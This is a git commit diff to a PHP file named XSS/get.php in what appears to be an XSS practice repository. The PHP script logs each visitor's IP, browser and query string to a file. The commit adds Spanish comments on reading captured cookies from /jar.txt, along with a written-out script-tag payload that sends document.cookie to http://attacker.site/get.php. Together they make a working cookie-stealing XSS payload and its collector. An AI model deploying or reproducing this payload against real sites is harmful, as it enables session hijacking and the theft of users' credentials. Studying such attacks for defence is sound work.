7befc650a8f1f71de5baec58563d9cfbdc793013
dogui <56701447+doguile@users.noreply.github.com>
2021-06-24 17:19:03 +0000

    Update get.php

--- XSS/get.php
+++ XSS/get.php
@@ -9,3 +9,8 @@ fwrite($fp,$ip,' ',$browser," \n");
 fwrite($fp, urldecode($_SERVER['QUERY_STRING']), " \n\n");
 fclose($fp);
 ?>
+
+// http://attacker.site/get.php?test=misdatos
+//para ver las cookies debemos cargar en la web /jar.txt
+// luego en la pagina vulnerable ejecurtar el payload
+//<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
